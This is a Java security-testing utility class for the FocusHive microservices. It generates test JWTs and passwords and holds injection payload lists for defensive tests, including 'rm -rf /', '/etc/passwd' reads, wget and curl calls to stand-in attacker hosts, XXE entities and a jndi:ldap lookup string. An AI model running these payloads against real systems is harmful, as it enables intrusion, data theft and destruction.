package com.focushive.security;

import com.fasterxml.jackson.databind.ObjectMapper;
import io.jsonwebtoken.Claims;
import io.jsonwebtoken.JwtBuilder;
import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.SignatureAlgorithm;
import io.jsonwebtoken.security.Keys;
import org.springframework.http.HttpHeaders;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.request.MockHttpServletRequestBuilder;

import javax.crypto.SecretKey;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.time.Instant;
import java.time.temporal.ChronoUnit;
import java.util.*;
import java.util.regex.Pattern;

/**
 * Comprehensive security testing utilities for FocusHive security integration tests.
 * Provides utilities for JWT manipulation, attack simulation, cryptographic testing,
 * and security validation across all microservices.
 * 
 * Features:
 * - JWT token generation and validation
 * - Attack payload generation (SQL injection, XSS, XXE, etc.)
 * - Cryptographic utilities for security testing
 * - Password strength testing
 * - Session management testing utilities
 * - Rate limiting test utilities
 * - Security header validation
 * - Timing attack detection utilities
 * 
 * @author FocusHive Security Team
 * @version 2.0
 * @since 2024-12-12
 */
public class SecurityTestUtils {

    private static final String TEST_JWT_SECRET = "test-secret-key-for-security-testing-only-minimum-256-bits-long";
    private static final SecretKey JWT_KEY = Keys.hmacShaKeyFor(TEST_JWT_SECRET.getBytes(StandardCharsets.UTF_8));
    private static final ObjectMapper objectMapper = new ObjectMapper();
    private static final BCryptPasswordEncoder passwordEncoder = new BCryptPasswordEncoder();
    private static final SecureRandom secureRandom = new SecureRandom();

    // Common attack patterns
    private static final List<String> SQL_INJECTION_PAYLOADS = Arrays.asList(
        "' OR '1'='1",
        "' UNION SELECT * FROM users--",
        "'; DROP TABLE users; --",
        "1' OR '1'='1' --",
        "admin'--",
        "' OR 1=1#",
        "') OR '1'='1--",
        "1'; INSERT INTO users VALUES('hacker','password'); --",
        "' OR 'x'='x",
        "1' AND 1=1 --"
    );

    private static final List<String> XSS_PAYLOADS = Arrays.asList(
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src=\"javascript:alert('XSS')\"></iframe>",
        "<input type=\"image\" src=\"x\" onerror=\"alert('XSS')\">",
        "<body onload=alert('XSS')>",
        "<div onclick=\"alert('XSS')\">Click me</div>",
        "<script>document.cookie='stolen='+document.cookie</script>",
        "<img src=\"x\" onerror=\"fetch('/api/admin/users').then(r=>r.json()).then(d=>alert(JSON.stringify(d)))\">"
    );

    private static final List<String> COMMAND_INJECTION_PAYLOADS = Arrays.asList(
        "; ls -la",
        "| whoami",
        "&& cat /etc/passwd",
        "; rm -rf /",
        "| nc -l 4444",
        "&& wget http://attacker.com/malware",
        "; curl http://evil.com/$(whoami)",
        "| ping -c 10 127.0.0.1",
        "&& echo 'hacked' > /tmp/pwned",
        "; id"
    );

    private static final List<String> PATH_TRAVERSAL_PAYLOADS = Arrays.asList(
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "....//....//....//etc//passwd",
        "../../../etc/shadow",
        "../../../../../../etc/passwd%00.jpg",
        "....\\....\\....\\etc\\passwd",
        "../../../proc/self/environ",
        "../../../../../../windows/system32/config/sam",
        "../../../var/log/auth.log",
        "....//....//....//proc//version"
    );

    private static final List<String> XXE_PAYLOADS = Arrays.asList(
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///etc/shadow\">]><data>&file;</data>",
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/evil.dtd\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY % remote SYSTEM \"http://attacker.com/evil.dtd\">%remote;]><data></data>"
    );

    private static final List<String> NOSQL_INJECTION_PAYLOADS = Arrays.asList(
        "{\"$where\": \"this.username == 'admin'\"}",
        "{\"$regex\": \".*\"}",
        "{\"username\": {\"$ne\": null}}",
        "{\"$or\": [{\"username\": \"admin\"}, {\"username\": \"administrator\"}]}",
        "{\"username\": {\"$regex\": \"^admin\"}}"
    );

    // Security test data patterns
    private static final Pattern EMAIL_PATTERN = Pattern.compile("^[A-Za-z0-9+_.-]+@(.+)$");
    private static final Pattern STRONG_PASSWORD_PATTERN = Pattern.compile("^(?=.*[a-z])(?=.*[A-Z])(?=.*\\d)(?=.*[@$!%*?&])[A-Za-z\\d@$!%*?&]{8,}$");

    // ============== JWT Utilities ==============

    /**
     * Generates a valid JWT token for testing with default claims
     */
    public static String generateValidJwtToken(String username) {
        return generateJwtToken(username, "USER", Instant.now().plus(1, ChronoUnit.HOURS));
    }

    /**
     * Generates a JWT token with custom parameters
     */
    public static String generateJwtToken(String username, String role, Instant expiration) {
        return generateJwtToken(username, role, expiration, UUID.randomUUID());
    }

    /**
     * Generates a JWT token with full customization
     */
    public static String generateJwtToken(String username, String role, Instant expiration, UUID userId) {
        return Jwts.builder()
                .setSubject(username)
                .claim("userId", userId.toString())
                .claim("role", role)
                .claim("authorities", Arrays.asList("ROLE_" + role))
                .setIssuedAt(Date.from(Instant.now()))
                .setExpiration(Date.from(expiration))
                .setIssuer("focushive-identity-service")
                .setAudience("focushive-services")
                .signWith(JWT_KEY, SignatureAlgorithm.HS256)
                .compact();
    }

    /**
     * Generates an expired JWT token
     */
    public static String generateExpiredJwtToken(String username) {
        return generateJwtToken(username, "USER", Instant.now().minus(1, ChronoUnit.HOURS));
    }

    /**
     * Generates a malformed JWT token
     */
    public static String generateMalformedJwtToken() {
        return "malformed.jwt.token";
    }

    /**
     * Generates a JWT token with tampered signature
     */
    public static String generateTamperedJwtToken(String username) {
        String validToken = generateValidJwtToken(username);
        return validToken.substring(0, validToken.length() - 5) + "12345";
    }

    /**
     * Extracts claims from JWT token
     */
    public static Claims extractClaims(String token) {
        return Jwts.parserBuilder()
                .setSigningKey(JWT_KEY)
                .build()
                .parseClaimsJws(token)
                .getBody();
    }

    /**
     * Adds JWT authorization header to request
     */
    public static MockHttpServletRequestBuilder withJwtToken(MockHttpServletRequestBuilder request, String token) {
        return request.header(HttpHeaders.AUTHORIZATION, "Bearer " + token);
    }

    // ============== Attack Payload Utilities ==============

    /**
     * Get SQL injection attack payloads
     */
    public static List<String> getSqlInjectionPayloads() {
        return new ArrayList<>(SQL_INJECTION_PAYLOADS);
    }

    /**
     * Get XSS attack payloads
     */
    public static List<String> getXssPayloads() {
        return new ArrayList<>(XSS_PAYLOADS);
    }

    /**
     * Get command injection payloads
     */
    public static List<String> getCommandInjectionPayloads() {
        return new ArrayList<>(COMMAND_INJECTION_PAYLOADS);
    }

    /**
     * Get path traversal payloads
     */
    public static List<String> getPathTraversalPayloads() {
        return new ArrayList<>(PATH_TRAVERSAL_PAYLOADS);
    }

    /**
     * Get XXE attack payloads
     */
    public static List<String> getXxePayloads() {
        return new ArrayList<>(XXE_PAYLOADS);
    }

    /**
     * Get NoSQL injection payloads
     */
    public static List<String> getNoSqlInjectionPayloads() {
        return new ArrayList<>(NOSQL_INJECTION_PAYLOADS);
    }

    /**
     * Generate custom SQL injection payload
     */
    public static String generateSqlInjectionPayload(String tableName, String columnName) {
        return String.format("' UNION SELECT %s FROM %s--", columnName, tableName);
    }

    /**
     * Generate XSS payload with custom script
     */
    public static String generateXssPayload(String script) {
        return String.format("<script>%s</script>", script);
    }

    // ============== Cryptographic Utilities ==============

    /**
     * Generate secure random password
     */
    public static String generateSecurePassword(int length) {
        String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*";
        StringBuilder password = new StringBuilder();
        
        for (int i = 0; i < length; i++) {
            password.append(chars.charAt(secureRandom.nextInt(chars.length())));
        }
        
        return password.toString();
    }

    /**
     * Generate weak password for testing
     */
    public static String generateWeakPassword() {
        return "password123";
    }

    /**
     * Hash password using BCrypt
     */
    public static String hashPassword(String password) {
        return passwordEncoder.encode(password);
    }

    /**
     * Verify password against hash
     */
    public static boolean verifyPassword(String password, String hash) {
        return passwordEncoder.matches(password, hash);
    }

    /**
     * Validate password strength
     */
    public static boolean isPasswordStrong(String password) {
        return STRONG_PASSWORD_PATTERN.matcher(password).matches();
    }

    /**
     * Generate secure random bytes
     */
    public static byte[] generateSecureRandomBytes(int length) {
        byte[] bytes = new byte[length];
        secureRandom.nextBytes(bytes);
        return bytes;
    }

    // ============== Session Management Utilities ==============

    /**
     * Generate session ID
     */
    public static String generateSessionId() {
        return UUID.randomUUID().toString();
    }

    /**
     * Generate CSRF token
     */
    public static String generateCsrfToken() {
        byte[] randomBytes = generateSecureRandomBytes(32);
        return Base64.getEncoder().encodeToString(randomBytes);
    }

    // ============== Rate Limiting Test Utilities ==============

    /**
     * Simulate concurrent requests for rate limiting tests
     */
    public static void simulateConcurrentRequests(Runnable request, int threadCount, int requestsPerThread) {
        List<Thread> threads = new ArrayList<>();
        
        for (int i = 0; i < threadCount; i++) {
            Thread thread = new Thread(() -> {
                for (int j = 0; j < requestsPerThread; j++) {
                    request.run();
                    try {
                        Thread.sleep(10); // Small delay between requests
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                        break;
                    }
                }
            });
            threads.add(thread);
        }
        
        // Start all threads
        threads.forEach(Thread::start);
        
        // Wait for all threads to complete
        threads.forEach(thread -> {
            try {
                thread.join();
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
        });
    }

    // ============== Timing Attack Detection Utilities ==============

    /**
     * Measure execution time for timing attack detection
     */
    public static long measureExecutionTime(Runnable operation) {
        long startTime = System.nanoTime();
        operation.run();
        long endTime = System.nanoTime();
        return endTime - startTime;
    }

    /**
     * Detect timing attack vulnerability
     */
    public static boolean isTimingAttackVulnerable(Runnable validOperation, Runnable invalidOperation, int iterations) {
        List<Long> validTimes = new ArrayList<>();
        List<Long> invalidTimes = new ArrayList<>();
        
        // Measure valid operations
        for (int i = 0; i < iterations; i++) {
            validTimes.add(measureExecutionTime(validOperation));
        }
        
        // Measure invalid operations
        for (int i = 0; i < iterations; i++) {
            invalidTimes.add(measureExecutionTime(invalidOperation));
        }
        
        // Calculate averages
        double validAverage = validTimes.stream().mapToLong(Long::longValue).average().orElse(0.0);
        double invalidAverage = invalidTimes.stream().mapToLong(Long::longValue).average().orElse(0.0);
        
        // Check if there's a significant timing difference (>10% threshold)
        double difference = Math.abs(validAverage - invalidAverage) / Math.max(validAverage, invalidAverage);
        return difference > 0.1;
    }

    // ============== Data Validation Utilities ==============

    /**
     * Validate email format
     */
    public static boolean isValidEmail(String email) {
        return email != null && EMAIL_PATTERN.matcher(email).matches();
    }

    /**
     * Generate test user data
     */
    public static Map<String, Object> generateTestUserData() {
        return Map.of(
            "username", "testuser_" + UUID.randomUUID().toString().substring(0, 8),
            "email", "test" + UUID.randomUUID().toString().substring(0, 8) + "@focushive.test",
            "password", generateSecurePassword(12),
            "firstName", "Test",
            "lastName", "User"
        );
    }

    /**
     * Generate malicious user data for testing
     */
    public static Map<String, Object> generateMaliciousUserData() {
        return Map.of(
            "username", "<script>alert('xss')</script>",
            "email", "'; DROP TABLE users; --",
            "password", "password",
            "firstName", "../../../etc/passwd",
            "lastName", "${jndi:ldap://attacker.com/evil}"
        );
    }

    // ============== Security Header Utilities ==============

    /**
     * Validate security headers presence
     */
    public static List<String> getRequiredSecurityHeaders() {
        return Arrays.asList(
            "X-Content-Type-Options",
            "X-Frame-Options",
            "X-XSS-Protection",
            "Content-Security-Policy",
            "Referrer-Policy",
            "Permissions-Policy",
            "Cache-Control"
        );
    }

    /**
     * Generate Content Security Policy for testing
     */
    public static String generateTestCSP() {
        return "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' https: data:; connect-src 'self' https: wss:; object-src 'none'; frame-src 'none'; base-uri 'self'; form-action 'self';";
    }

    // ============== JSON Utilities ==============

    /**
     * Convert object to JSON string
     */
    public static String toJson(Object object) {
        try {
            return objectMapper.writeValueAsString(object);
        } catch (Exception e) {
            throw new RuntimeException("Failed to convert object to JSON", e);
        }
    }

    /**
     * Convert JSON string to object
     */
    public static <T> T fromJson(String json, Class<T> clazz) {
        try {
            return objectMapper.readValue(json, clazz);
        } catch (Exception e) {
            throw new RuntimeException("Failed to convert JSON to object", e);
        }
    }

    // ============== Test Data Generation ==============

    /**
     * Generate test data for brute force testing
     */
    public static List<String> generateBruteForcePasswords() {
        return Arrays.asList(
            "password", "123456", "password123", "admin", "qwerty", 
            "letmein", "welcome", "monkey", "dragon", "12345678",
            "password1", "123456789", "welcome123", "admin123", "root"
        );
    }

    /**
     * Generate test usernames for enumeration testing
     */
    public static List<String> generateTestUsernames() {
        return Arrays.asList(
            "admin", "administrator", "root", "test", "guest",
            "user", "demo", "service", "api", "system"
        );
    }

    // ============== Utility Methods ==============

    /**
     * Sleep for specified duration (for timing tests)
     */
    public static void sleep(long milliseconds) {
        try {
            Thread.sleep(milliseconds);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }

    /**
     * Generate random string of specified length
     */
    public static String randomString(int length) {
        String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        StringBuilder result = new StringBuilder();
        for (int i = 0; i < length; i++) {
            result.append(chars.charAt(secureRandom.nextInt(chars.length())));
        }
        return result.toString();
    }

    /**
     * Check if string contains any malicious patterns
     */
    public static boolean containsMaliciousContent(String input) {
        if (input == null) return false;
        
        String lowerInput = input.toLowerCase();
        return lowerInput.contains("<script>") ||
               lowerInput.contains("javascript:") ||
               lowerInput.contains("'; drop table") ||
               lowerInput.contains("union select") ||
               lowerInput.contains("../") ||
               lowerInput.contains("..\\") ||
               lowerInput.contains("${") ||
               lowerInput.contains("eval(");
    }
}